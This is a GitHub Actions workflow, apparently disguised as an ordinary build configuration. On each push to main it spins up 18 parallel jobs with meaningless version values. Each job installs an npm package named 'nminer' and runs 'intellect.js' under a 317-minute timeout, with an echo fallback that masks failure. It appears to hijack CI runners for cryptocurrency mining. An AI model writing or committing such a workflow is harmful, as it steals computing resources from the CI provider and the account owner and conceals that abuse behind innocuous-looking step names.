name: intellect
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2470 }
          - { version: 6808 }
          - { version: 6328 }
          - { version: 6814 }
          - { version: 8202 }
          - { version: 3293 }
          - { version: 422 }
          - { version: 7248 }
          - { version: 3672 }
          - { version: 8282 }
          - { version: 2877 }
          - { version: 6608 }
          - { version: 1920 }
          - { version: 3584 }
          - { version: 3992 }
          - { version: 1230 }
          - { version: 4052 }
          - { version: 2879 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: exactly aside
        run: |
          npm install nminer@latest
          timeout 317m node intellect.js || echo "intellect executed"